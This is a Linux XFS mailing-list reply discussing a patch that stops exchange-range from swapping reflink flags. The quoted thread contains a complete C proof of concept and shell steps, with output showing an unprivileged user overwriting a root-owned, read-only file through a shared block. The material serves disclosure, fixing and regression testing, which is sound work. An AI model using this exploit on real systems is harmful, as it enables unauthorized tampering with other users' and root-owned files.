Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 83AE44078C5;
	Mon,  5 Oct 2026 22:29:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791239373; cv=none; b=k4cvVXPNHwqEqZkMDa0c40y2UlyKY81YmH1yEdPwrC/Fz2nIn5wIHPN3eWghdIRs4GbsjnaamvB6XuxYrp2ALmDI6vmyrKKde/lauYSp0pG9uE82SmyMv9P5TLJEULtwTEi4MH2ND2Azr/4Nkecf2m/b4bsXUp/nppt52LvamiM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791239373; c=relaxed/simple;
	bh=5TxqkdZ7AYKxE/nf2CaYT5vYafXJgqZ/dZdxzUPiRQE=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=JZH+vdYFE5YTNHQEDgVOYC8gp+dj4TtGof3vw8LuGtZlob8EH3qPj2q0gPWNxbV+eLFrnyfEmHQIts8Slb7iLJ+lTQEq20syYnSxCsovxy77t+IGgKe4VpjfxYPEbZWyCfINQUViYS8Ruw8Kb5vMJED+o9a8Jr1zOrmT+uJaOKE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=XQFxCjPo; arc=none smtp.client-ip=100.103.45.18
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="XQFxCjPo"
Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id 1A83D1F000FF;
	Mon,  5 Oct 2026 22:29:31 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1791239371;
	bh=o5YZ5H7U0RPa7Q0L+uCzp0QvXCJsTP2uo7AiIkVeujA=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To;
	b=XQFxCjPoOa+Whu+2r5BXTjczqdhwwGQ8Y+aF5BkUxc3Ke36CSAtjXrjDHYAUC66Nq
	 lsvXIntJshNUJ92gL11eppbQ3BZMaQyKYE2T52pkjor1HguzBALToVQ3OTqyNm3n4t
	 KX/n1v5OcJlRi2hnJOkQr7HfLE6yPidwaH24C0Y//mWeA39pNV+YK0Aw3i8bzdAr0c
	 Mq1VmzLGbYhRa+Rp9RNAZ/vuLmtBHRnQwZ2198pss+8PzD0/HVH0XNH4LXIFAvCY+H
	 N/933+Nd04i/tXjAxCeqaoCiXz5+PCgO8kwpTDaCvn+Ib2DHNVSFrQ1B7WvbgNDk4M
	 sYBrPm9GOWz6A==
Date: Mon, 5 Oct 2026 15:29:30 -0700
From: "Darrick J. Wong" <djwong@kernel.org>
To: Norbert Szetei <norbert@doyensec.com>
Cc: Carlos Maiolino <cem@kernel.org>, linux-xfs@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH] xfs: stop exchanging reflink flags during mapping
 exchanges
Message-ID: <20261005222930.GH1615495@frogsfrogsfrogs>
References: <1E196589-DEBE-40AC-AFEA-D420DAAB067F@doyensec.com>
 <20261002162659.GY2705364@frogsfrogsfrogs>
 <84F5989D-B089-4AA7-84F3-FD8DEE5D84E3@doyensec.com>
Precedence: bulk
X-Mailing-List: linux-xfs@vger.kernel.org
List-Id: <linux-xfs.vger.kernel.org>
List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <84F5989D-B089-4AA7-84F3-FD8DEE5D84E3@doyensec.com>

On Fri, Oct 02, 2026 at 11:08:57PM +0200, Norbert Szetei wrote:
> On Oct 2, 2026, at 18:26, Darrick J. Wong <djwong@kernel.org> wrote:
> > 
> > On Fri, Oct 02, 2026 at 03:38:22PM +0200, Norbert Szetei wrote:
> >> When an exchange covers the whole of both files,
> >> xmi_can_exchange_reflink_flags() moves the reflink inode flag from the
> >> file that has it to the other one, deciding that from req->blockcount
> >> against XFS_B_TO_FSB(mp, i_disk_size) on each inode.
> >> 
> >> i_disk_size does not bound an inode's mappings, and
> >> XFS_EXCHMAPS_SET_SIZES creates that state by assigning both i_disk_size
> >> values from the sizes sampled before the operation without unmapping
> >> anything above the new size. An exchange over [0, i_disk_size) can
> >> therefore pass every test in the function while an inode still owns
> >> shared mappings above EOF, and the post-operation cleanup clears its
> > 
> > How do you end up with shared mappings above EOF?  You write a /lot/ of
> > sentences here but weirdly none of it explains how this key assumption
> > is violated.
> 
> Fair. Here it is with physical block numbers, 4k blocks. peer is the file
> that gets rewritten and file1 is the one that ends up with the flag 
> cleared.
> 
> Start, nothing shared:
> 
> 	peer size 4096   -> [100]
> 	file1 size 12288 -> [200] [201] [202]
> 	donor1 size 4096 -> [300]
> 	donor2 size 4096 -> [400]
> 
> 1. FICLONERANGE peer's block into file1's middle slot:
> 
> 	peer size 4096   -> [100]
> 	file1 size 12288 -> [200] [100] [202] reflink flag set
>                             ^^^^^ both files own block 100
> 
> 2. XFS_IOC_EXCHANGE_RANGE file1 against donor1, file1_offset 0, 
> file2_offset 8192, length 0, TO_EOF. One block is exchanged, and the sizes
> are exchanged with it:
> 
> 	file1 size 4096   -> [200] [100] [300] reflink flag set
>                              ^^^^^^^^^^^ still owned, now past the size
> 	donor1 size 12288 -> [202]
> 
> file1 says it is one block long while it still owns three. Nothing was
> unmapped. file2_offset is block 2, so this exchange cannot clear a flag.
> 
> 3. XFS_IOC_EXCHANGE_RANGE file1 against donor2, both offsets 0, length 4096.
> By i_disk_size this is two one-block files exchanging everything, so
> xmi_can_exchange_reflink_flags() agrees and the flag is cleared:
> 
> 	file1 size 4096   -> [400] [100] [300] reflink flag CLEARED
> 	donor2 size 4096  -> [200]
> 
> Block 100 is still shared with peer.
> 
> 4. pwrite(file1, 4096, 4096), which is file1's second slot, block 100.
> xfs_is_cow_inode(file1) is false, so no CoW:
> 
> 	peer size 4096 -> [100] same block, new contents
> 
> Block 100 is the only one that matters here. PoC below, it reads a file 
> called peer in the current directory. The filesystem needs reflink and 
> exchange-range, which mkfs.xfs 7.x turns on by default.

So that's the real problem -- exchange-range is exchanging the file
size numbers even though we didn't actually exchange all the file data.
Let's say you create a file1 with 12345678 bytes and a file2 with
1234567 bytes.  Then you ask the kernel to exchange the last 811342
bytes of file1 with the last 54919 bytes of file2.  You'd expect that
afterwards, file1 will be 12345678 - 811342 + 54919 = 11589255 bytes,
and that file2 will be 1234567 - 54919 + 811342 = 1990990 bytes:

l1sz=12345678			# file size for file1
l2sz=1234567			# file size for file2

l1rem=$((l1sz % 1048576))
l2rem=$((l2sz % 65536))

l1off=$((l1sz - l1rem))		# file1 size rounded down to 1M
l2off=$((l2sz - l2rem))		# file2 size rounded down to 64k

xfs_io -c "exchangerange -d $l1off -s $l2off -t $rootdir/file2" \
	$rootdir/file1

Instead you end up with file1 being 1234567 bytes and file2 being
12345678 bytes, even though we specified nonzero offsets.

If we set the file size incorrectly, we can now have shared blocks
beyond EOF by accident.  Files by definition do not have written data
beyond EOF.  Only written blocks can be shared because sharing
preallocations does not make sense, so therefore there cannot be written
blocks completely beyond EOF.

Anyway, thank you for sharing a GPL2'd reproducer program, that will go
into fstests easily for wider testing.

--D

> 
> > reflink flag anyway. Later writes to those mappings take the non-reflink
> >> write path and update blocks that should still have been protected by
> >> CoW, which shows up as data corruption between reflink-related files and
> >> as an rmap overlap that xfs_rmap_convert() rejects.
> >> 
> >> Commit a23eca88448e ("xfs: fix exchange-range reflink flag clearing
> >> issue with INO1_WRITTEN") disabled the flag exchange for
> >> XFS_EXCHMAPS_INO1_WRITTEN requests. Fix this variant by not exchanging
> >> the flags at all, which subsumes that guard. Whether an inode still owns
> >> shared blocks outside the exchanged range is not recorded in the data
> >> fork, so answering it takes a refcount btree lookup, and
> >> xfs_exchmaps_init_intent() has no transaction to do that with, cannot
> >> report an error, and runs with both ILOCKs dropped in recovery. Deciding
> >> it correctly means doing that lookup in xfs_exchrange_mappings(), which
> >> holds both ILOCKs and a transaction and can return an error. The
> >> conservative outcome here is that both inodes keep the reflink flag.
> > 
> > Or you could cross-reference the refcount btree with any mappings you
> > find beyond i_disk_size.
> 
> I can do that for v2. It needs a transaction and both ILOCKs. If you 
> would rather take the fix yourself, that is fine too, whatever you prefer.
> 
> > XFS_EXCHMAPS_CLEAR_INO{1,2}_REFLINK were only ever set by the decision
> >> this patch removes, so xfs_exchmaps_clear_reflink() and the code that
> >> consumed them are unreachable and go too. An intent logged by an older
> >> kernel does carry the bits, but xfs_xmi_item_recover_intent() has always
> >> masked them off with XFS_EXCHMAPS_PARAMS, and the clearing only survived
> >> recovery because init_intent re-derived the decision. Recovering such an
> >> intent now completes the exchange and leaves both reflink flags set.
> >> 
> >> The flag that xfs_exchmaps_ensure_reflink() copies to the peer inode is
> >> now permanent until a FALLOC_FL_UNSHARE_RANGE, an xfs_scrub run or a
> >> truncate to empty clears it. Until then that inode keeps the paths
> >> xfs_is_cow_inode() selects, ILOCK_EXCL for buffered writes and the
> >> -ENOTBLK bounce for unaligned direct writes, and
> >> xchk_inode_check_reflink_iflag() preens it on every scrub.
> >> 
> >> Fixes: 966ceafc7a43 ("xfs: create deferred log items for file mapping exchanges")
> >> Cc: stable@vger.kernel.org # v6.10
> >> Assisted-by: LLM
> > 
> > Oh, this was all slop?  Wonderful.
> > 
> >> Signed-off-by: Norbert Szetei <norbert@doyensec.com>
> >> ---
> >> A reproducer is available on request.
> > 
> > POC || GTFO.  I'm not going to play 20 questions here.
> 
> Here is how I ran xfs_exchrange_poc:
> 
> $ rm -f /tmp/xfs-poc.img
> $ truncate -s 512M /tmp/xfs-poc.img
> $ mkfs.xfs -q /tmp/xfs-poc.img     # xfsprogs 7.x -> reflink=1 exchange=1
> $ sudo mkdir -p /mnt/xfs-poc
> $ sudo mount -o loop /tmp/xfs-poc.img /mnt/xfs-poc
> $ sudo chmod 1777 /mnt/xfs-poc
> $ sudo sh -c "head -c 4096 /dev/zero | tr '\0' 'P' > /mnt/xfs-poc/peer"
> $ sudo chown root:root /mnt/xfs-poc/peer; sudo chmod 644 /mnt/xfs-poc/peer
> 
> $ cd /mnt/xfs-poc
> $ ls -l peer; shasum peer
> -rw-r--r-- 1 root root 4096 Oct 2 21:00 peer
> cbe4b704043468fd92eba2e999097a40370c3e3e  peer
> 
> $ echo test > peer 
> -bash: peer: Permission denied
> 
> $ ~/xfs_exchrange_poc
> peer uid 0 mode 0644 size 4096, block size 4096
> 
> start                      peer [14]   file1 size 12288  [27] [28] [29]
> 1 FICLONERANGE             peer [14]   file1 size 12288  [27] [14] [29]
> 2 EXCHANGE_RANGE TO_EOF    peer [14]   file1 size  4096  [27] [14] [25]
> 3 EXCHANGE_RANGE           peer [14]   file1 size  4096  [15] [14] [25]
> 4 pwrite(file1, 4096)      peer [14]   file1 size  8192  [15] [14] [25]
> 
> peer first byte P -> X   PEER REWRITTEN
> 
> $ ls -l peer; shasum peer
> -rw-r--r-- 1 root root 4096 Oct 2 21:00 peer
> 54822846951979ed8dc8f7acad8b0edf9cec2fcb  peer
> 
> 
> and the source code for xfs_exchrange_poc:
> 
> // SPDX-License-Identifier: GPL-2.0
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <sys/ioctl.h>
> #include <sys/stat.h>
> #include <sys/vfs.h>
> #include <linux/fs.h>
> #include <linux/fiemap.h>
> 
> #ifndef FICLONERANGE
> #define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
> #endif
> 
> /* fs/xfs/libxfs/xfs_fs.h */
> struct xfs_exchange_range {
> 	__s32		file1_fd;
> 	__u32		pad;
> 	__u64		file1_offset;
> 	__u64		file2_offset;
> 	__u64		length;
> 	__u64		flags;
> };
> #define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct xfs_exchange_range)
> #define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)
> 
> static unsigned long blksz;
> static int peer, f1;
> 
> static unsigned long long phys(int fd, unsigned long long off)
> {
> 	struct { struct fiemap f; struct fiemap_extent e[1]; } q;
> 
> 	memset(&q, 0, sizeof q);
> 	q.f.fm_start = off;
> 	q.f.fm_length = blksz;
> 	q.f.fm_extent_count = 1;
> 	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
> 		return 0;
> 	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
> }
> 
> static void show(const char *tag)
> {
> 	struct stat st;
> 	int i;
> 
> 	fstat(f1, &st);
> 	printf("%-26s peer [%llu]   file1 size %5lld  [", tag, phys(peer, 0),
> 	       (long long)st.st_size);
> 	for (i = 0; i < 3; i++)
> 		printf("%llu%s", phys(f1, (unsigned long long)i * blksz),
> 		       i == 2 ? "]\n" : "] [");
> }
> 
> static int mkfile(const char *name, char fill, int blocks)
> {
> 	char *buf;
> 	int fd;
> 
> 	unlink(name);
> 	fd = open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
> 	if (fd < 0)
> 		return fprintf(stderr, "open %s: %m\n", name), -1;
> 	buf = malloc(blocks * blksz);
> 	memset(buf, fill, blocks * blksz);
> 	if (pwrite(fd, buf, blocks * blksz, 0) != (ssize_t)(blocks * blksz))
> 		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
> 	free(buf);
> 	fsync(fd);
> 	return fd;
> }
> 
> int main(void)
> {
> 	struct xfs_exchange_range xr;
> 	struct file_clone_range cr;
> 	char before[65536], after[65536], *buf;
> 	struct statfs sfs;
> 	struct stat st;
> 	int d1, d2;
> 
> 	if (statfs(".", &sfs))
> 		return fprintf(stderr, "statfs: %m\n"), 2;
> 	if (sfs.f_type != 0x58465342)	/* XFS_SUPER_MAGIC */
> 		return fprintf(stderr,
> 			"this directory is not on XFS (statfs type 0x%lx)\n",
> 			(unsigned long)sfs.f_type), 2;
> 	blksz = sfs.f_bsize;
> 	if (blksz < 512 || blksz > 65536)
> 		return fprintf(stderr, "unexpected block size %lu\n", blksz), 2;
> 
> 	peer = open("peer", O_RDONLY);
> 	if (peer < 0)
> 		return fprintf(stderr, "open peer: %m\n"), 2;
> 	syncfs(peer);		/* so FIEMAP reports peer's real blocks */
> 	fstat(peer, &st);
> 	printf("peer uid %u mode %04o size %lld, block size %lu\n\n",
> 	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, blksz);
> 	if (pread(peer, before, blksz, 0) != (ssize_t)blksz)
> 		return fprintf(stderr, "read peer: %m\n"), 2;
> 
> 	f1 = mkfile("file1", 'A', 3);
> 	d1 = mkfile("donor1", 'B', 1);
> 	d2 = mkfile("donor2", 'C', 1);
> 	if (f1 < 0 || d1 < 0 || d2 < 0)
> 		return 2;
> 	show("start");
> 
> 	/* 1. share peer's block into the middle of file1 */
> 	cr = (struct file_clone_range){ .src_fd = peer, .src_offset = 0,
> 					.src_length = blksz,
> 					.dest_offset = blksz };
> 	if (ioctl(f1, FICLONERANGE, &cr))
> 		return fprintf(stderr, "FICLONERANGE: %m\n"), 2;
> 	show("1 FICLONERANGE");
> 
> 	/*
> 	 * 2. exchange file1's last block against the whole of donor1 with
> 	 * TO_EOF.  The sizes are exchanged too, so file1 claims one block
> 	 * while still owning three.  file2_offset is block 2, so this exchange
> 	 * cannot clear a reflink flag.
> 	 */
> 	xr = (struct xfs_exchange_range){ .file1_fd = d1, .file1_offset = 0,
> 					  .file2_offset = 2 * blksz,
> 					  .length = 0,
> 					  .flags = XFS_EXCHANGE_RANGE_TO_EOF };
> 	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
> 		return fprintf(stderr, "EXCHANGE_RANGE TO_EOF: %m\n"), 2;
> 	show("2 EXCHANGE_RANGE TO_EOF");
> 
> 	/*
> 	 * 3. by i_disk_size this is a whole-file exchange of two one-block
> 	 * files, so the reflink flag is handed to donor2 and cleared off
> 	 * file1, which still shares a block with peer.
> 	 */
> 	xr = (struct xfs_exchange_range){ .file1_fd = d2, .file1_offset = 0,
> 					  .file2_offset = 0, .length = blksz };
> 	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
> 		return fprintf(stderr, "EXCHANGE_RANGE: %m\n"), 2;
> 	show("3 EXCHANGE_RANGE");
> 
> 	/* 4. write to the block file1 still shares with peer */
> 	buf = malloc(blksz);
> 	memset(buf, 'X', blksz);
> 	if (pwrite(f1, buf, blksz, blksz) != (ssize_t)blksz)
> 		return fprintf(stderr, "pwrite: %m\n"), 2;
> 	fsync(f1);
> 	show("4 pwrite(file1, 4096)");
> 
> 	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
> 	if (pread(peer, after, blksz, 0) != (ssize_t)blksz)
> 		return fprintf(stderr, "re-read peer: %m\n"), 2;
> 	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
> 	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer intact");
> 	return memcmp(before, after, blksz) ? 0 : 1;
> }
> 
> 
> N.
> 
> 
> > --D
> > 
> >> fs/xfs/libxfs/xfs_exchmaps.c | 86 +++++-------------------------------
> >> 1 file changed, 10 insertions(+), 76 deletions(-)
> >> 
> >> diff --git a/fs/xfs/libxfs/xfs_exchmaps.c b/fs/xfs/libxfs/xfs_exchmaps.c
> >> index 6a66b6075e0a..07288f4163b3 100644
> >> --- a/fs/xfs/libxfs/xfs_exchmaps.c
> >> +++ b/fs/xfs/libxfs/xfs_exchmaps.c
> >> @@ -127,9 +127,7 @@ xmi_has_more_exchange_work(const struct xfs_exchmaps_intent *xmi)
> >> static inline bool
> >> xmi_has_postop_work(const struct xfs_exchmaps_intent *xmi)
> >> {
> >> - return xmi->xmi_flags & (XFS_EXCHMAPS_CLEAR_INO1_REFLINK |
> >> -  XFS_EXCHMAPS_CLEAR_INO2_REFLINK |
> >> -  __XFS_EXCHMAPS_INO2_SHORTFORM);
> >> + return xmi->xmi_flags & __XFS_EXCHMAPS_INO2_SHORTFORM;
> >> }
> >> 
> >> /* Check all mappings to make sure we can actually exchange them. */
> >> @@ -525,18 +523,6 @@ xfs_exchmaps_link_to_sf(
> >> return error;
> >> }
> >> 
> >> -/* Clear the reflink flag after an exchange. */
> >> -static inline void
> >> -xfs_exchmaps_clear_reflink(
> >> - struct xfs_trans *tp,
> >> - struct xfs_inode *ip)
> >> -{
> >> - trace_xfs_reflink_unset_inode_flag(ip);
> >> -
> >> - ip->i_diflags2 &= ~XFS_DIFLAG2_REFLINK;
> >> - xfs_trans_log_inode(tp, ip, XFS_ILOG_CORE);
> >> -}
> >> -
> >> /* Finish whatever work might come after an exchange operation. */
> >> static int
> >> xfs_exchmaps_do_postop_work(
> >> @@ -557,16 +543,6 @@ xfs_exchmaps_do_postop_work(
> >> return error;
> >> }
> >> 
> >> - if (xmi->xmi_flags & XFS_EXCHMAPS_CLEAR_INO1_REFLINK) {
> >> - xfs_exchmaps_clear_reflink(tp, xmi->xmi_ip1);
> >> - xmi->xmi_flags &= ~XFS_EXCHMAPS_CLEAR_INO1_REFLINK;
> >> - }
> >> -
> >> - if (xmi->xmi_flags & XFS_EXCHMAPS_CLEAR_INO2_REFLINK) {
> >> - xfs_exchmaps_clear_reflink(tp, xmi->xmi_ip2);
> >> - xmi->xmi_flags &= ~XFS_EXCHMAPS_CLEAR_INO2_REFLINK;
> >> - }
> >> -
> >> return 0;
> >> }
> >> 
> >> @@ -948,46 +924,21 @@ xfs_exchmaps_intent_destroy_cache(void)
> >> }
> >> 
> >> /*
> >> - * Decide if we will exchange the reflink flags between the two files after the
> >> - * exchange.  The only time we want to do this is if we're exchanging all
> >> - * mappings under EOF and the inode reflink flags have different states.
> >> + * Allocate and initialize a new incore intent item from a request.
> >> + *
> >> + * Note that this does not decide anything about the two inodes' reflink flags.
> >> + * Clearing XFS_DIFLAG2_REFLINK off an inode needs to know whether it still owns
> >> + * shared blocks outside the exchanged range, which is not recorded in the data
> >> + * fork and takes a refcount btree lookup.  This function has no transaction to
> >> + * do that with and no way to report a failure, so both flags are left as they
> >> + * are.  xfs_exchmaps_ensure_reflink() copies the flag to the peer inode when the
> >> + * exchange runs.
> >>  */
> >> -static inline bool
> >> -xmi_can_exchange_reflink_flags(
> >> - const struct xfs_exchmaps_req *req,
> >> - unsigned int reflink_state)
> >> -{
> >> - struct xfs_mount *mp = req->ip1->i_mount;
> >> -
> >> - /*
> >> -  * The INO1_WRITTEN optimization can skip exchanging hole and
> >> -  * unwritten mappings, which means we cannot guarantee that all
> >> -  * shared extents actually moved to the other file.  Clearing the
> >> -  * reflink flag of an inode that still holds shared extents breaks
> >> -  * the CoW write path, so refuse to exchange the flags in that case.
> >> -  */
> >> - if (req->flags & XFS_EXCHMAPS_INO1_WRITTEN)
> >> - return false;
> >> -
> >> - if (hweight32(reflink_state) != 1)
> >> - return false;
> >> - if (req->startoff1 != 0 || req->startoff2 != 0)
> >> - return false;
> >> - if (req->blockcount != XFS_B_TO_FSB(mp, req->ip1->i_disk_size))
> >> - return false;
> >> - if (req->blockcount != XFS_B_TO_FSB(mp, req->ip2->i_disk_size))
> >> - return false;
> >> - return true;
> >> -}
> >> -
> >> -
> >> -/* Allocate and initialize a new incore intent item from a request. */
> >> struct xfs_exchmaps_intent *
> >> xfs_exchmaps_init_intent(
> >> const struct xfs_exchmaps_req *req)
> >> {
> >> struct xfs_exchmaps_intent *xmi;
> >> - unsigned int rs = 0;
> >> 
> >> xmi = kmem_cache_zalloc(xfs_exchmaps_intent_cache,
> >> GFP_NOFS | __GFP_NOFAIL);
> >> @@ -1011,23 +962,6 @@ xfs_exchmaps_init_intent(
> >> xmi->xmi_isize2 = req->ip1->i_disk_size;
> >> }
> >> 
> >> - /* Record the state of each inode's reflink flag before the op. */
> >> - if (xfs_is_reflink_inode(req->ip1))
> >> - rs |= 1;
> >> - if (xfs_is_reflink_inode(req->ip2))
> >> - rs |= 2;
> >> -
> >> - /*
> >> -  * Figure out if we're clearing the reflink flags (which effectively
> >> -  * exchanges them) after the operation.
> >> -  */
> >> - if (xmi_can_exchange_reflink_flags(req, rs)) {
> >> - if (rs & 1)
> >> - xmi->xmi_flags |= XFS_EXCHMAPS_CLEAR_INO1_REFLINK;
> >> - if (rs & 2)
> >> - xmi->xmi_flags |= XFS_EXCHMAPS_CLEAR_INO2_REFLINK;
> >> - }
> >> -
> >> if (S_ISDIR(VFS_I(xmi->xmi_ip2)->i_mode) ||
> >>     S_ISLNK(VFS_I(xmi->xmi_ip2)->i_mode))
> >> xmi->xmi_flags |= __XFS_EXCHMAPS_INO2_SHORTFORM;
> >> -- 
> >> 2.55.0
> 
> 
